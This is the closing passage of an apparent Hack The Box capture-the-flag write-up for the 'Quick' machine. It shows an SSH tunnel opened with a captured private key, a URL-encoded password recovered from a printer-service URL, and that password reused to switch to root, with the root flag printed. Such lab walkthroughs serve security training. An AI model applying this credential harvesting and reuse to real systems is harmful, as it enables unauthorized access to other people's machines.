zweilos@kalimaa:~/htb/quick$ ssh -L 40905:10.10.10.186:443 -i srvadm.id_rsa srvadm@quick.htb
then
https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
decodes to 
https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer
```

I thought `&ftQ4K3SGde8?` looked like it was being used as a password, so I tested it to see if I could use sudo as `srvadm`, but it didn't work. I decided to try something crazy, and tried to `su` to `root`...and it worked!

### Root.txt

```text
srvadm@quick:~/.cache/conf.d$ su root
Password: 
root@quick:/home/srvadm/.cache/conf.d# cd /root
root@quick:~# whoami && uname -a
root
Linux quick 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@quick:~# cat root.txt 
d5d1c123d8fd11db776d25ddb3e8256a
```

Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

